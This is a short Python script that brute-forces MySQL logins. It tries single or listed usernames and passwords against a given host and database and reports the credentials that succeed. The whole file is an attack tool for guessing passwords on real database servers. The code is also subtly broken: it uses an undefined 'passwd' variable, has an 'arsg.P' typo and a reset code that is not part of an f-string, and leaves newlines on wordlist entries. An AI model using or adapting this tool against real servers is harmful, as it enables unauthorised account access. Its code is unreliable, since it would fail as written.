import _mysql
import argparse
import colorama
import os
from colorama import Fore, Back, Style

colorama.init(autoreset=True)

def mysql_login(host="", user="", passwd="", db="", verbose=False):
	try:
		db = _mysql.connect(host=host, user=user, passwd=passwd, db=db)
		print(f"{Fore.GREEN}[+] Found:" , user, ":" , passwd, "{Fore.RESET}")

	except:
		if verbose != False:
			print(f"{Fore.RED}[-] Failed:", user, ":", passwd, "{Fore.RESET}")

def mysql_brute(user="", userlist="", password="", passwordlist="", verbose=False, db="", host=""):
	if user != None and password != None:
		mysql_login(host=host, user=user, passwd=passwd, db=db, verbose=verbose)

	elif user != None and passwordlist != None:
		file = open(passwordlist)
		passwords = file.readlines()
		for passw in passwords:
			mysql_login(host=host, user=user, passwd=passw, db=db, verbose=verbose)

	elif userlist != None and password != None:
		file = open(userlist)
		users = file.readlines()
		for usr in users:
			mysql_login(host=host, user=usr, passwd=password, db=db, verbose=verbose)

	elif userlist != None and passwordlist != None:
		file1 = open(userlist)
		users = file1.readlines()
		file2 = open(passwordlist)
		passwords = file2.readlines()
		for usr in users:
			for passw in passwords:
				mysql_login(host=host, user=usr, passwd=passw, db=db, verbose=verbose)

	else:
		pass


argument_parser = argparse.ArgumentParser(description='Mysql brute force')
argument_parser.add_argument("-u", required=False, type=str, help='single user')
argument_parser.add_argument("-U", required=False, type=str, help='user from file')
argument_parser.add_argument("-p", required=False, type=str, help='single password')
argument_parser.add_argument("-P", required=False, type=str, help='password from file')
argument_parser.add_argument("-v", required=False, action='store_true', help='verbose')
argument_parser.add_argument("-d", required=True, type=str, help='database name')
argument_parser.add_argument("-H", required=True, type=str, help='host')
args = argument_parser.parse_args()

mysql_brute(user=args.u, userlist=args.U, password=args.p, passwordlist=arsg.P, verbose=args.v, db=args.d, host=args.H)
